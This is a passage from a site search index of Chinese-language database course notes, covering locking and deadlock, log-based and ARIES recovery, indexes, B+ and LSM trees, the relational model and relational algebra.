protocol)\uff1a\u8981\u6c42\u4e8b\u52a1\u63d0\u4ea4\u524d\u4e0d\u5f97\u91ca\u653e \u4efb\u4f55\u9501\u3002 \u9501\u8f6c\u6362(Lock Conversions)\uff1a\u63d0\u4f9b\u4e86\u4e00\u79cd\u5c06 S \u9501\u5347\u7ea7\u4e3a X \u9501\uff0cX \u9501\u964d\u7ea7\u4e3a S \u9501\u7684\u673a\u5236\u3002\u53ea\u80fd\u5728\u589e \u957f\u9636\u6bb5\u5347\u7ea7\uff0c\u7f29\u51cf\u9636\u6bb5\u964d\u7ea7\u3002 DeadLock \u4e92\u76f8\u6301\u6709\u9501\u7684\u65f6\u5019\u89e6\u53d1\u6b7b\u9501 \u53ef\u4ee5\u901a\u8fc7\u6267\u884c\u4e8b\u52a1\u524d\u5c31\u8981\u6c42\u62ff\u5230\u9501\u4ee5\u907f\u514d\u8fd0\u884c\u65f6\u6b7b\u9501\uff08\u5f53\u7136\u8fd9\u6837\u505a\u5c31\u4f1a\u6709\u76f8\u5e94\u7684\u6027\u80fd\u4ee3\u4ef7\uff09 \u901a\u8fc7\u753b\u4f9d\u8d56\u56fe\u5224\u65ad\u662f\u5426\u4ea7\u751f\u6b7b\u9501 \u6b7b\u9501\u6062\u590d\uff1a\u9009\u53d6\u4e00\u4e9b\u4e8b\u52a1\u8fdb\u884c\u56de\u6eda\u3002\u5f53\u91cd\u590d\u9009\u53d6\u540c\u6837\u7684\u4e8b\u52a1\u727a\u7272(victim)\u5e76\u4e0d\u65ad\u9677\u5165\u6b7b\u9501\u65f6\uff0c\u5373\u9677\u5165starvation(\u9965\u997f)","title":"Concurrency Control"},{"location":"course/db/transaction/#recovery-system","text":"","title":"Recovery System"},{"location":"course/db/transaction/#log-based-recovery","text":"\u65e5\u5fd7(log)\u88ab\u5b58\u50a8\u5728\u7a33\u5b9a\u7684\u5b58\u50a8\u4e2d\uff0c\u5305\u542b\u4e00\u7cfb\u5217\u7684\u65e5\u5fd7\u8bb0\u5f55 \u4e8b\u52a1\u5f00\u59cb <T start> \u5199\u64cd\u4f5c\u4e4b\u524d\u4e4b\u524d\u7684\u65e5\u5fd7\u8bb0\u5f55 <Ti, x, V1, V2> (X)\u662f\u5199\u7684\u4f4d\u7f6e\uff0c V1\uff0cV2\u5206\u522b\u662f\u5199\u4e4b\u524d\u548c\u4e4b\u540e\u7684X\u5904\u7684\u503c \u4e8b\u52a1\u7ed3\u675f\u7684\u65f6\u5019\u5199\u5165 <T commit> \u5bf9\u4e8e\u66f4\u65b0\u4e8b\u52a1\u7684\u4e24\u6761\u89c4\u5219 commit rule\uff1a\u65b0\u7684\u6570\u636e\u5728commit\u4e4b\u524d\u5fc5\u987b\u88ab\u5199\u5728 \u975e\u6613\u5931\u6027 \u7684\u5b58\u50a8\u5668\u4e2d logging rule\uff1a\u65e7\u7684\u503c\u5728\u65b0\u7684\u5199\u5165\u4e4b\u524d\u9700\u8981\u88ab\u5199\u5728\u65e5\u5fd7\u91cc","title":"log-based Recovery \u57fa\u4e8e\u65e5\u5fd7\u7684\u6062\u590d"},{"location":"course/db/transaction/#aries","text":"Log \u8bb0\u5f55\u4e00\u4e9b\u5fc5\u8981\u4fe1\u606f Page LSN \u6bcf\u4e00\u9875\u7684LSN \u662f\u6bcf\u4e00\u9875\u4e2d\u6700\u540e\u4e00\u6761\u8d77\u4f5c\u7528\u7684\u65e5\u5fd7\u8bb0\u5f55\u7684LSN\u7f16\u53f7 Log Buffer \u8bb0\u5f55\u7684\u7f13\u51b2\u533a\uff0c\u8fd8\u6ca1\u6709\u5199\u5165Stable log Dirty Page Table \u5b58\u50a8\u5728\u7f13\u51b2\u533a\u7684\uff0c\u8bb0\u5f55\u5df2\u7ecf\u88ab\u66f4\u65b0\u8fc7\u7684page\u7684\u8868 \u6bcf\u4e2a\u9875\u7684RecLSN\uff0c\u8868\u793a\u8fd9\u4e00\u9875\u7684\u65e5\u5fd7\u8bb0\u5f55\u4e2d\uff0c\u5728RecLSN\u4e4b\u524d\u7684Log\u5df2\u7ecf\u90fd\u88ab\u5199\u5165Stable log Checkpoint \u8bb0\u5f55\u810f\u9875\u8868\u4fe1\u606f\u548c\u6d3b\u8dc3\u4e8b\u52a1\u7684LastLSN \u548clog-based Recovery\u4e0d\u540c\u7684\u662f\uff0c\u5b83\u4e0d\u4f1a\u628a\u5185\u5b58\u9875\u5199\u5165\u78c1\u76d8 \u6062\u590d\u64cd\u4f5c \u5206\u6790\u9636\u6bb5 \u8bfb\u53d6\u6700\u540e\u4e00\u6761\u5b8c\u6574\u7684checkpoint\u65e5\u5fd7\u8bb0\u5f55\u4fe1\u606f \u8bbe\u7f6eRedoLSN = min RecLSN(\u810f\u9875\u8868\u4e2d\u7684)\uff0c\u5982\u679c\u810f\u9875\u8868\u662f\u7a7a\u7684\u5c31\u8bbe\u7f6e\u4e3acheckpoint\u7684LSN(\u51b3\u5b9a\u4ece\u54ea\u91cc\u5f00\u59cbredo) \u8bbe\u7f6eundo-list\uff1acheckpoint\u4e2d\u8bb0\u5f55\u7684\u4e8b\u52a1 \u8bfb\u53d6undo-list\u4e2d\u6bcf\u4e00\u4e2a\u4e8b\u52a1\u7684\u6700\u540e\u4e00\u6761\u8bb0\u5f55\u7684LSN \u4ececheckpoint\u5f00\u59cb\u6b63\u5411\u626b\u63cf \u5982\u679c\u53d1\u73b0\u4e86\u4e0d\u5728undo-list\u4e2d\u7684\u8bb0\u5f55\u5c31\u5199\u5165undo-list \u5f53\u53d1\u73b0\u4e00\u6761\u66f4\u65b0\u8bb0\u5f55\u7684\u65f6\u5019\uff0c\u5982\u679c\u8fd9\u4e00\u9875\u4e0d\u5728\u810f\u9875\u8868\u4e2d\uff0c\u7528\u8be5\u8bb0\u5f55\u7684LSN\u4f5c\u4e3a RecLSN\u5199\u5165\u810f\u9875\u8868\u4e2d \u5982\u679c\u53d1\u73b0\u4e86\u6807\u5fd7\u4e8b\u52a1\u7ed3\u675f\u7684\u65e5\u5fd7\u8bb0\u5f55(commit, abort) \u5c31\u4eceundo-list\u4e2d\u79fb\u9664\u8fd9\u4e2a\u4e8b\u52a1 Redo\u9636\u6bb5 \u4eceRedoLSN\u5f00\u59cb\u6b63\u5411\u626b\u63cf\uff0c\u5f53\u53d1\u73b0\u66f4\u65b0\u8bb0\u5f55\u7684\u65f6\u5019\u5982\u679c\u8fd9\u4e00\u9875\u4e0d\u5728\u810f\u9875\u8868\u4e2d\u3002\u6216\u8005\u8fd9\u4e00\u6761\u8bb0\u5f55\u7684LSN\u5c0f\u4e8e\u9875\u9762\u7684RecLSN\u5c31\u5ffd\u7565\u8fd9\u4e00\u6761 \u5426\u5219\u4ece\u78c1\u76d8\u4e2d\u8bfb\u53d6\u8fd9\u4e00\u9875\uff0c\u5982\u679c\u78c1\u76d8\u4e2d\u5f97\u5230\u7684\u8fd9\u4e00\u9875\u7684PageLSN\u6bd4\u8fd9\u4e00\u6761\u8981\u5c0f\uff0c\u5c31redo\uff0c\u5426\u5219\u5c31\u5ffd\u7565\u8fd9\u4e00\u6761\u8bb0\u5f55 Undo\u9636\u6bb5 \u4ece\u65e5\u5fd7\u672b\u5c3e\u5148\u524d\u5411\u524d\u641c\u7d22\uff0cundo\u6240\u6709undo-list\u4e2d\u6709\u7684\u4e8b\u52a1 \u7528\u5206\u6790\u9636\u6bb5\u7684\u6700\u540e\u4e00\u4e2aLSN\u6765\u627e\u5230\u6bcf\u4e2a\u65e5\u5fd7\u6700\u540e\u7684\u8bb0\u5f55 \u6bcf\u6b21\u9009\u62e9\u4e00\u4e2a\u6700\u5927\u7684LSN\u5bf9\u5e94\u7684\u4e8b\u52a1undo \u5728undo\u4e00\u6761\u8bb0\u5f55\u4e4b\u540e \u5bf9\u4e8e\u666e\u901a\u7684\u8bb0\u5f55\uff0c\u5c06NextLSN\u8bbe\u7f6e\u4e3aPrevLSN \u5bf9\u4e8eCLR\u8bb0\u5f55\uff0c\u5c06NextLSN\u8bbe\u7f6e\u4e3aUndoNextLSN \u5982\u4f55undo\uff1a\u5f53\u4e00\u6761\u8bb0\u5f55undo\u7684\u65f6\u5019 \u751f\u6210\u4e00\u4e2a\u5305\u542b\u6267\u884c\u64cd\u4f5c\u7684CLR \u8bbe\u7f6eCLR\u7684UndoNextLSN\u4e3a\u66f4\u65b0\u8bb0\u5f55\u7684LSN","title":"Aries\u7b97\u6cd5"},{"location":"course/db/index/","text":"Database Index \u6982\u8ff0 \u6570\u636e\u5e93\u7d22\u5f15\u662f\u4e3a\u4e86\u4fbf\u4e8e\u5728\u5404\u6837\u7684\u64cd\u4f5c\u4e2d\u5b9a\u4f4d\u6240\u9700\u7684\u6570\u636e\u9879\u3002\u6839\u636e\u7d22\u5f15\u65b9\u5f0f\u53ef\u5206\u4e3a\u987a\u5e8f\u7d22\u5f15\u3001\u6563\u5217\u7d22\u5f15\u7b49\u3002 \u987a\u5e8f\u7d22\u5f15(ordered indices) \u987e\u540d\u601d\u4e49\uff0c\u5c31\u662f\u5bf9\u6570\u636e\u8fdb\u884c\u987a\u5e8f\u7684\u7d22\u5f15\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u4e0a\u9762\u8fd9\u6837\u7684\u4e00\u4e00\u5bf9\u5e94\u5173\u7cfb\uff0c\u53c8\u88ab\u79f0\u4e3a \u7a20\u5bc6\u7d22\u5f15 (Cluster Index)\u3002 \u5982\u679c\u6070\u597d\u6570\u636e\u672c\u8eab\u5c31\u662f\u4f9d\u7167\u8fd9\u4e2a\u7d22\u5f15\u987a\u5e8f\u6392\u5217\u7684\uff0c\u90a3\u4e48\u8fd9\u4e2a\u7d22\u5f15\u4e5f\u88ab\u79f0\u4e3a \u4e3b\u7d22\u5f15 (\u805a\u96c6\u7d22\u5f15)(Primary Index)\uff1b\u53cd\u4e4b\uff0c\u5219\u4e3a \u8f85\u52a9\u7d22\u5f15 (\u975e\u805a\u96c6\u7d22\u5f15)(Secondary Index)\uff0c\u6bd4\u5982\u4e0b\u56fe\uff1a \u5bf9\u4e8e \u4e3b\u7d22\u5f15 \uff0c\u6211\u4eec\u53ef\u4ee5\u91c7\u53d6 \u7a00\u758f\u7d22\u5f15 (Dense Index)\u7684\u65b9\u5f0f\u8282\u7701\u7d22\u5f15\u7a7a\u95f4\uff1a \u4f46\u6709\u65f6\uff0c\u76f4\u63a5\u7a20\u5bc6\u7d22\u5f15\u4e0d\u80fd\u88ab\u76f4\u63a5\u653e\u5728Memory\u4e2d\uff08\u56e0\u4e3a\u592a\u5927\u4e86\uff09\uff0c\u6240\u4ee5\u9700\u8981\u91c7\u7528 \u591a\u7ea7\u7d22\u5f15 *(Multilevel Index)\u7684\u65b9\u5f0f\u3002\u5206\u4e3aouter index\u548cinner index\u3002 B+\u6811\u7d22\u5f15 \u5b9e\u9645\u4e0aB+\u6811\u7d22\u5f15\u4e5f\u5c5e\u4e8e\u987a\u5e8f\u7d22\u5f15\u3002\u987e\u540d\u601d\u4e49\uff0c\u5c31\u662f\u5229\u7528B+\u6811\u5efa\u7acb\u7d22\u5f15\uff0cB+\u6811\u7684\u5185\u5bb9\u53ef\u4ee5\u53c2\u8003 B+ Tree \u3002 \u5728\u5b9e\u9645\u7684\u5de5\u4e1a\u5e94\u7528\u4e2d\uff0c B+ Tree \u5f80\u5f80\u4f1a\u548c LSM Tree \u7ed3\u5408\u4f7f\u7528\uff0c\u4ee5\u51cf\u5c11\u5728Disk\u4e2d\u53cd\u590d\u64cd\u4f5c\u7684overhead\uff08\u5199\u4f18\u5316\uff09\u3002 \u6563\u5217\u7d22\u5f15 \u4f7f\u7528Hash\u8868\u8fdb\u884c\u7d22\u5f15\u3002","title":"Database Index"},{"location":"course/db/index/#database-index","text":"","title":"Database Index"},{"location":"course/db/index/#_1","text":"\u6570\u636e\u5e93\u7d22\u5f15\u662f\u4e3a\u4e86\u4fbf\u4e8e\u5728\u5404\u6837\u7684\u64cd\u4f5c\u4e2d\u5b9a\u4f4d\u6240\u9700\u7684\u6570\u636e\u9879\u3002\u6839\u636e\u7d22\u5f15\u65b9\u5f0f\u53ef\u5206\u4e3a\u987a\u5e8f\u7d22\u5f15\u3001\u6563\u5217\u7d22\u5f15\u7b49\u3002","title":"\u6982\u8ff0"},{"location":"course/db/index/#ordered-indices","text":"\u987e\u540d\u601d\u4e49\uff0c\u5c31\u662f\u5bf9\u6570\u636e\u8fdb\u884c\u987a\u5e8f\u7684\u7d22\u5f15\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u4e0a\u9762\u8fd9\u6837\u7684\u4e00\u4e00\u5bf9\u5e94\u5173\u7cfb\uff0c\u53c8\u88ab\u79f0\u4e3a \u7a20\u5bc6\u7d22\u5f15 (Cluster Index)\u3002 \u5982\u679c\u6070\u597d\u6570\u636e\u672c\u8eab\u5c31\u662f\u4f9d\u7167\u8fd9\u4e2a\u7d22\u5f15\u987a\u5e8f\u6392\u5217\u7684\uff0c\u90a3\u4e48\u8fd9\u4e2a\u7d22\u5f15\u4e5f\u88ab\u79f0\u4e3a \u4e3b\u7d22\u5f15 (\u805a\u96c6\u7d22\u5f15)(Primary Index)\uff1b\u53cd\u4e4b\uff0c\u5219\u4e3a \u8f85\u52a9\u7d22\u5f15 (\u975e\u805a\u96c6\u7d22\u5f15)(Secondary Index)\uff0c\u6bd4\u5982\u4e0b\u56fe\uff1a \u5bf9\u4e8e \u4e3b\u7d22\u5f15 \uff0c\u6211\u4eec\u53ef\u4ee5\u91c7\u53d6 \u7a00\u758f\u7d22\u5f15 (Dense Index)\u7684\u65b9\u5f0f\u8282\u7701\u7d22\u5f15\u7a7a\u95f4\uff1a \u4f46\u6709\u65f6\uff0c\u76f4\u63a5\u7a20\u5bc6\u7d22\u5f15\u4e0d\u80fd\u88ab\u76f4\u63a5\u653e\u5728Memory\u4e2d\uff08\u56e0\u4e3a\u592a\u5927\u4e86\uff09\uff0c\u6240\u4ee5\u9700\u8981\u91c7\u7528 \u591a\u7ea7\u7d22\u5f15 *(Multilevel Index)\u7684\u65b9\u5f0f\u3002\u5206\u4e3aouter index\u548cinner index\u3002","title":"\u987a\u5e8f\u7d22\u5f15(ordered indices)"},{"location":"course/db/index/#b","text":"\u5b9e\u9645\u4e0aB+\u6811\u7d22\u5f15\u4e5f\u5c5e\u4e8e\u987a\u5e8f\u7d22\u5f15\u3002\u987e\u540d\u601d\u4e49\uff0c\u5c31\u662f\u5229\u7528B+\u6811\u5efa\u7acb\u7d22\u5f15\uff0cB+\u6811\u7684\u5185\u5bb9\u53ef\u4ee5\u53c2\u8003 B+ Tree \u3002 \u5728\u5b9e\u9645\u7684\u5de5\u4e1a\u5e94\u7528\u4e2d\uff0c B+ Tree \u5f80\u5f80\u4f1a\u548c LSM Tree \u7ed3\u5408\u4f7f\u7528\uff0c\u4ee5\u51cf\u5c11\u5728Disk\u4e2d\u53cd\u590d\u64cd\u4f5c\u7684overhead\uff08\u5199\u4f18\u5316\uff09\u3002","title":"B+\u6811\u7d22\u5f15"},{"location":"course/db/index/#_2","text":"\u4f7f\u7528Hash\u8868\u8fdb\u884c\u7d22\u5f15\u3002","title":"\u6563\u5217\u7d22\u5f15"},{"location":"course/db/index/Bplus/","text":"B+ Tree \u57fa\u672c\u6982\u5ff5 \u975e\u9875\u8282\u70b9\u6709 \\(\\lceil n/2\\rceil \\sim n\\) \u4e2a\u5b50\u8282\u70b9\uff0c\u53f6\u8282\u70b9\u6709 \\(\\lceil(n-1)/2\\rceil \\sim n-1\\) \u4e2a\u503c\u3002 \u652f\u6301\u64cd\u4f5c\uff1a\u589e\u5220\u67e5\u6539\uff08\u5177\u4f53\u89c1ADS\u4e2dB+\u6811\u7684\u5404\u79cd\u64cd\u4f5c\uff09\uff0c\u590d\u6742\u5ea6\u4e3a \\(\\log{N}\\) Bottom up B+ tree Build \u5bf9\u4e8e\u4e00\u4e2a\u5e8f\u5217\uff0c\u82e5\u8981\u5c06\u5176\u6784\u5efa\u6210B+\u6811\uff0c\u9700\u8981\u7ecf\u8fc7\u4ee5\u4e0b\u6d41\u7a0b \u5bf9\u5e8f\u5217\u8fdb\u884c\u6392\u5e8f \u5bf9\u5e8f\u5217\u8fdb\u884c\u5212\u5206\uff08\u6839\u636eB+\u6811\u7684\u652f\u6301\u5757\u5927\u5c0f\u8fdb\u884c\u5212\u5206\uff09\u6bd4\u5982\u5bf9\u4e8e\u652f\u6301n=5\u7684B+\u6811\uff0c\u6392\u5e8f\u957f\u5ea6\u4e3a13\u7684\u5e8f\u5217\uff0c\u5219\u5212\u5206\u4e3a4+4+3+2(\u6700\u540e\u4e24\u5757\u4e0d\u80fd\u662f4+1\uff0c\u56e0\u4e3a \\(1<\\lceil (4-1)/2\\rceil\\) ) \u6784\u5efa\u5b8c\u6700\u5e95\u5c42\u4e4b\u540e\uff0c\u518d\u4ece\u4e0b\u81f3\u4e0a\u6784\u5efa \u5199\u5165\u78c1\u76d8\uff08seek\u4e00\u6b21\uff0c\u7136\u540e\u987a\u5e8f\u5199\u5165\uff09 \u5408\u5e76B+\u6811 \u5982\u679c\u8981\u5408\u5e76\u4e24\u4e2aB+\u6811\uff0c\u6d41\u7a0b\u5982\u4e0b \u4ece\u78c1\u76d8\u4e2d\u8bfb\u53d6B+\u6811\u7684\u53f6\u5b50\u8282\u70b9\uff08seek\u4e00\u6b21\uff0c\u7136\u540e\u987a\u5e8f\u8bfb\u51fa\uff0c\u56e0\u4e3a\u53f6\u5b50\u8282\u70b9\u662f\u8fde\u7eed\u5b58\u50a8\u7684\uff09 \u5408\u5e76\u6709\u5e8f\u5e8f\u5217 \u91cd\u590dBottom up B+ tree build\u7684\u64cd\u4f5c","title":"B+ Tree"},{"location":"course/db/index/Bplus/#b-tree","text":"","title":"B+ Tree"},{"location":"course/db/index/Bplus/#_1","text":"\u975e\u9875\u8282\u70b9\u6709 \\(\\lceil n/2\\rceil \\sim n\\) \u4e2a\u5b50\u8282\u70b9\uff0c\u53f6\u8282\u70b9\u6709 \\(\\lceil(n-1)/2\\rceil \\sim n-1\\) \u4e2a\u503c\u3002 \u652f\u6301\u64cd\u4f5c\uff1a\u589e\u5220\u67e5\u6539\uff08\u5177\u4f53\u89c1ADS\u4e2dB+\u6811\u7684\u5404\u79cd\u64cd\u4f5c\uff09\uff0c\u590d\u6742\u5ea6\u4e3a \\(\\log{N}\\)","title":"\u57fa\u672c\u6982\u5ff5"},{"location":"course/db/index/Bplus/#bottom-up-b-tree-build","text":"\u5bf9\u4e8e\u4e00\u4e2a\u5e8f\u5217\uff0c\u82e5\u8981\u5c06\u5176\u6784\u5efa\u6210B+\u6811\uff0c\u9700\u8981\u7ecf\u8fc7\u4ee5\u4e0b\u6d41\u7a0b \u5bf9\u5e8f\u5217\u8fdb\u884c\u6392\u5e8f \u5bf9\u5e8f\u5217\u8fdb\u884c\u5212\u5206\uff08\u6839\u636eB+\u6811\u7684\u652f\u6301\u5757\u5927\u5c0f\u8fdb\u884c\u5212\u5206\uff09\u6bd4\u5982\u5bf9\u4e8e\u652f\u6301n=5\u7684B+\u6811\uff0c\u6392\u5e8f\u957f\u5ea6\u4e3a13\u7684\u5e8f\u5217\uff0c\u5219\u5212\u5206\u4e3a4+4+3+2(\u6700\u540e\u4e24\u5757\u4e0d\u80fd\u662f4+1\uff0c\u56e0\u4e3a \\(1<\\lceil (4-1)/2\\rceil\\) ) \u6784\u5efa\u5b8c\u6700\u5e95\u5c42\u4e4b\u540e\uff0c\u518d\u4ece\u4e0b\u81f3\u4e0a\u6784\u5efa \u5199\u5165\u78c1\u76d8\uff08seek\u4e00\u6b21\uff0c\u7136\u540e\u987a\u5e8f\u5199\u5165\uff09","title":"Bottom up B+ tree Build"},{"location":"course/db/index/Bplus/#b","text":"\u5982\u679c\u8981\u5408\u5e76\u4e24\u4e2aB+\u6811\uff0c\u6d41\u7a0b\u5982\u4e0b \u4ece\u78c1\u76d8\u4e2d\u8bfb\u53d6B+\u6811\u7684\u53f6\u5b50\u8282\u70b9\uff08seek\u4e00\u6b21\uff0c\u7136\u540e\u987a\u5e8f\u8bfb\u51fa\uff0c\u56e0\u4e3a\u53f6\u5b50\u8282\u70b9\u662f\u8fde\u7eed\u5b58\u50a8\u7684\uff09 \u5408\u5e76\u6709\u5e8f\u5e8f\u5217 \u91cd\u590dBottom up B+ tree build\u7684\u64cd\u4f5c","title":"\u5408\u5e76B+\u6811"},{"location":"course/db/index/lsm/","text":"LSM Tree \u57fa\u672c\u6982\u5ff5 \u4e00\u79cd\u5199\u4f18\u5316\u7684\u5b58\u50a8\u7ed3\u6784 \u91c7\u53d6\u5206\u5c42\u5b58\u50a8\u7684\u7ed3\u6784 \u76f8\u6bd4\u4e8eB+\u6811\uff0c\u5b83\u5728\u603b\u80fd\u4fdd\u6301\u5728\u5185\u5b58\u4e2d\u5199 \u5177\u4f53\u7b56\u7565 Memory\u7684 \\(L_0\\) \u5c42\u6ee1\u4e4b\u540e\uff0c\u76f4\u63a5\u5199\u5165Disk\u4e2d\u7684 \\(L_0^1\\) \u5c42\uff08\u53ea\u9700\u8981\u4e00\u6b21\u7684seek\u5373\u53ef\uff09\uff1b \u5f53Disk\u7684 \\(L_0\\) \u5c42\u6ee1\u65f6\uff0c\u9700\u8981\u5408\u5e76(Compaction) \\(L_0\\) \u5c42\u6240\u6709\u7684\u6811\uff0c\u7136\u540e\u518d\u5199\u5165 \\(L_1\\) \u5c42\uff1b \u5f53\u6d89\u53ca\u66f4\u65b0/\u5220\u9664\u64cd\u4f5c\u65f6\uff0c\u540c\u6837\u5316\u4e3a\u63d2\u5165\u64cd\u4f5c\u6267\u884c\u63d2\u5165\u3002\u5e76\u5728Compaction\u65f6\u6b63\u5f0f\u6267\u884c\u3002","title":"LSM Tree"},{"location":"course/db/index/lsm/#lsm-tree","text":"","title":"LSM Tree"},{"location":"course/db/index/lsm/#_1","text":"\u4e00\u79cd\u5199\u4f18\u5316\u7684\u5b58\u50a8\u7ed3\u6784 \u91c7\u53d6\u5206\u5c42\u5b58\u50a8\u7684\u7ed3\u6784 \u76f8\u6bd4\u4e8eB+\u6811\uff0c\u5b83\u5728\u603b\u80fd\u4fdd\u6301\u5728\u5185\u5b58\u4e2d\u5199","title":"\u57fa\u672c\u6982\u5ff5"},{"location":"course/db/index/lsm/#_2","text":"Memory\u7684 \\(L_0\\) \u5c42\u6ee1\u4e4b\u540e\uff0c\u76f4\u63a5\u5199\u5165Disk\u4e2d\u7684 \\(L_0^1\\) \u5c42\uff08\u53ea\u9700\u8981\u4e00\u6b21\u7684seek\u5373\u53ef\uff09\uff1b \u5f53Disk\u7684 \\(L_0\\) \u5c42\u6ee1\u65f6\uff0c\u9700\u8981\u5408\u5e76(Compaction) \\(L_0\\) \u5c42\u6240\u6709\u7684\u6811\uff0c\u7136\u540e\u518d\u5199\u5165 \\(L_1\\) \u5c42\uff1b \u5f53\u6d89\u53ca\u66f4\u65b0/\u5220\u9664\u64cd\u4f5c\u65f6\uff0c\u540c\u6837\u5316\u4e3a\u63d2\u5165\u64cd\u4f5c\u6267\u884c\u63d2\u5165\u3002\u5e76\u5728Compaction\u65f6\u6b63\u5f0f\u6267\u884c\u3002","title":"\u5177\u4f53\u7b56\u7565"},{"location":"course/db/sql/","text":"Relational Model \u57fa\u672c\u7ed3\u6784 \u4e00\u5f20\u8868\u5bf9\u5e94\u4e00\u4e2a\u5173\u7cfb(relation)\uff0c\u884c\u5bf9\u5e94\u5143\u7ec4(tuple)\uff0c\u5217\u5bf9\u5e94\u5c5e\u6027(attribute) \u7801 key Let \\(K \\subseteq R\\) \\(K\\) is a superkey of \\(R\\) is values for \\(K\\) are sufficient to identify a unique tuple of each possible relation \\(K\\) is a condidate key is \\(K\\) is minial superkey \\(K\\) is a primary key , if K is a candidate key and is defined by user explicitly Foreign key Assume there exists relations \\(r\\) and \\(s\\) : \\(r(A,B,C)\\) , \\(s(B,D)\\) , we can say that attribute \\(B\\) in relation \\(r\\) is foreign key referencing \\(s\\) , and \\(r\\) is a referencing relation, and \\(s\\) is a referenced relation. \u5173\u7cfb\u4ee3\u6570 \u5173\u7cfb\u4ee3\u6570\u662fRelational Model\u7684\u6570\u5b66\u57fa\u7840\uff0c\u8be6\u89c1 Relational algebra SQL SQL\uff1a\u7ed3\u6784\u5316\u67e5\u8be2\u8bed\u8a00\uff0c\u5206\u4e3aDDL,DML,DCL\u51e0\u79cd\u7c7b\u578b\uff0c\u8be6\u89c1 SQL","title":"Relational Model"},{"location":"course/db/sql/#relational-model","text":"","title":"Relational Model"},{"location":"course/db/sql/#_1","text":"\u4e00\u5f20\u8868\u5bf9\u5e94\u4e00\u4e2a\u5173\u7cfb(relation)\uff0c\u884c\u5bf9\u5e94\u5143\u7ec4(tuple)\uff0c\u5217\u5bf9\u5e94\u5c5e\u6027(attribute) \u7801 key Let \\(K \\subseteq R\\) \\(K\\) is a superkey of \\(R\\) is values for \\(K\\) are sufficient to identify a unique tuple of each possible relation \\(K\\) is a condidate key is \\(K\\) is minial superkey \\(K\\) is a primary key , if K is a candidate key and is defined by user explicitly Foreign key Assume there exists relations \\(r\\) and \\(s\\) : \\(r(A,B,C)\\) , \\(s(B,D)\\) , we can say that attribute \\(B\\) in relation \\(r\\) is foreign key referencing \\(s\\) , and \\(r\\) is a referencing relation, and \\(s\\) is a referenced relation.","title":"\u57fa\u672c\u7ed3\u6784"},{"location":"course/db/sql/#_2","text":"\u5173\u7cfb\u4ee3\u6570\u662fRelational Model\u7684\u6570\u5b66\u57fa\u7840\uff0c\u8be6\u89c1 Relational algebra","title":"\u5173\u7cfb\u4ee3\u6570"},{"location":"course/db/sql/#sql","text":"SQL\uff1a\u7ed3\u6784\u5316\u67e5\u8be2\u8bed\u8a00\uff0c\u5206\u4e3aDDL,DML,DCL\u51e0\u79cd\u7c7b\u578b\uff0c\u8be6\u89c1 SQL","title":"SQL"},{"location":"course/db/sql/algebra/","text":"Relational Algebra \u57fa\u672c\u64cd\u4f5c \u64cd\u4f5c \u8868\u8fbe\u5f0f \u542b\u4e49 \u9009\u62e9 \\(\\sigma_p(r)\\) \u8fd4\u56de\u5173\u7cfb \\(r\\) \u4e2d\u6ee1\u8db3\u5173\u7cfb\u5f0f \\(p\\) \u7684\u5143\u7ec4\u7684\u5173\u7cfb \u6295\u5f71 \\(\\Pi_{A_1,A_2,\\dots,A_k(r)}\\) \u8fd4\u56de\u5173\u7cfb \\(r\\) \u4e2d\u5c5e\u6027\u4e3a \\(A_1,A_2,\\dots,A_k\\) \u7684\u5217\u5e76 \u53bb\u91cd \u96c6\u5408\u5e76 \\(r\\cup s\\) \u5c06\u4e24\u4e2a\u5c5e\u6027\u6570\u76f8\u7b49\u4e14\u6240\u6709\u5c5e\u6027\u7684\u57df\u76f8\u540c\u7684\u4e24\u4e2a\u5173\u7cfb\u5408\u5e76\u4e3a\u540c\u4e00\u4e2a\u5173\u7cfb\uff0c\u5e76 \u53bb\u91cd \u96c6\u5408\u5dee \\(r-s\\) \u8fd4\u56de\u5c5e\u4e8e\u5173\u7cfb \\(r\\) \u5374\u4e0d\u51fa\u73b0\u5728\u5173\u7cfb \\(s\\) \u4e2d\u7684\u5143\u7ec4\u7684\u5173\u7cfb \u7b1b\u5361\u5c14\u79ef \\(r\\times s\\) \u8fd4\u56de\u4efb\u610f\u4e24\u4e2a\u5173\u7cfb\u7684\u5143\u7ec4\u7ec4\u5408\uff08\u4e24\u4e2a\u5173\u7cfb\u7684\u5c5e\u6027\u5e94\u4e0d\u76f8\u4ea4\uff0c\u5426\u5219\u5e94\u91cd\u547d\u540d\uff09 \u91cd\u547d\u540d \\(\\rho_{x}(E)\\) \u5c06 \\(E\\) \u91cd\u547d\u540d\u4e3a \\(x\\) \u5e76\u8fd4\u56de \u62d3\u5c55\u64cd\u4f5c \u64cd\u4f5c \u8868\u8fbe\u5f0f \u542b\u4e49 \u96c6\u5408\u4ea4 \\(r\\cap s\\) \u53d6\u540c\u65f6\u51fa\u73b0\u5728\u4e24\u4e2a\u5173\u7cfb\u4e2d\u7684\u5143\u7ec4\uff0c\u53ef\u8f6c\u5316\u4e3a \\(r-(r-s)\\) \u81ea\u7136\u8fde\u63a5 \\(r\\bowtie s\\) \u53d6\u4e24\u4e2a\u5173\u7cfb\u516c\u5171\u5c5e\u6027\u4e2d\u5177\u6709 \u76f8\u540c\u5c5e\u6027\u503c \u7684\u5143\u7ec4\u8fdb\u884c\u62fc\u63a5 theta\u8fde\u63a5 \\(r\\bowtie_\\theta s\\) \u8fd4\u56de\u6ee1\u8db3\u5173\u7cfb\u5f0f \\(\\theta\\) \u7684\u81ea\u7136\u8fde\u63a5\u7ed3\u679c \u9664 \\(r\\div s\\) \\(r\\div s =\\{t \\vert t\\in\\Pi_{R-S}(r)\\cap \\forall u \\in s(tu\\in r)\\}\\) \u805a\u96c6 \\(_{G_1,G_2,\\dots, G_n}\\ \\mathcal{G}_{F_1(A_1),F_2(A_2),\\dots,F_n(A_n)}(r)\\) \\(G_i\\) \u662f\u7528\u4e8e\u5206\u7ec4\u7684\u5c5e\u6027\uff0c \\(F_i\\) \u662f\u805a\u96c6\u51fd\u6570\uff0c \\(A_i\\) \u662f\u5c5e\u6027\u540d \u8d4b\u503c \\(r\\leftarrow s\\) \u5c06\u53f3\u8fb9\u7684\u8ba1\u7b97\u7ed3\u679c\u8d4b\u503c\u7ed9\u5de6\u8fb9\u7684\u8868","title":"Relational Algebra"},{"location":"course/db/sql/algebra/#relational-algebra","text":"","title":"Relational Algebra"},{"location":"course/db/sql/algebra/#_1","text":"\u64cd\u4f5c \u8868\u8fbe\u5f0f \u542b\u4e49 \u9009\u62e9 \\(\\sigma_p(r)\\) 